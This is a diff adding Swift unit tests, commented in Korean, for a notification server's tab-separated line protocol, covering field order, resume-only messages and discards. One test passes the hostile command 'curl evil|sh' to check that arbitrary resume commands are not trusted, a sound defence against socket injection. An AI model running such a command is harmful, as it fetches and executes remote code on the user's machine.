@@ -49,4 +49,33 @@ final class HookFrameParseTests: XCTestCase {
         XCTAssertNil(NotifyServer.parseHook("TAB-1\tdone\t제목\t본문"))
         XCTAssertNotNil(NotifyServer.parse("TAB-1\tdone\t제목\t본문"), "레거시 경로는 그대로 살아야 한다")
     }
+
+    // MARK: 줄 프로토콜 7필드 — <tabId>\t<state>\t<title>\t<body>\t<category>\t<resumeCommand>\t<agentLabel>
+    // CLI(muxa-notify/main.swift)가 이 인덱스로 쓴다. off-by-one이면 알림이 조용히 오배송된다.
+
+    func testLineProtocolFieldOrder() {
+        let msg = NotifyServer.parse("TAB-1\twaiting\t제목\t본문\tneeds-permission\tclaude --resume abc\tclaude")
+        XCTAssertEqual(msg?.tabId, "TAB-1")
+        XCTAssertEqual(msg?.state, .waiting)
+        XCTAssertEqual(msg?.title, "제목")
+        XCTAssertEqual(msg?.body, "본문")
+        XCTAssertEqual(msg?.category, .needsPermission)
+        XCTAssertEqual(msg?.resume?.command, "claude --resume abc")
+        XCTAssertEqual(msg?.resume?.agentLabel, "claude")
+    }
+
+    /// 고정 꼴 재개 명령은 훅(신뢰)으로, 임의 명령은 추측(.scan)으로 — 소켓 주입 자동 실행 차단.
+    func testLineProtocolResumeTrustFollowsCommandShape() {
+        XCTAssertEqual(NotifyServer.parse("T\t\t\t\t\tclaude --resume abc\t")?.resume?.source, .hook)
+        XCTAssertEqual(NotifyServer.parse("T\t\t\t\t\tcurl evil|sh\t")?.resume?.source, .scan)
+    }
+
+    /// resume 단독(상태 없음)도 유효 — 바인딩만 등록한다. 상태·resume 둘 다 없으면 폐기.
+    func testLineProtocolResumeOnlyAndDiscard() {
+        let resumeOnly = NotifyServer.parse("T\t\t\t\t\tclaude --resume abc\t")
+        XCTAssertNil(resumeOnly?.state)
+        XCTAssertNotNil(resumeOnly?.resume)
+        XCTAssertNil(NotifyServer.parse("T\t\t\t\t\t\t"), "상태도 resume도 없으면 폐기")
+        XCTAssertNil(NotifyServer.parse("\tdone\t\t"), "tabId 비면 폐기")
+    }
 }
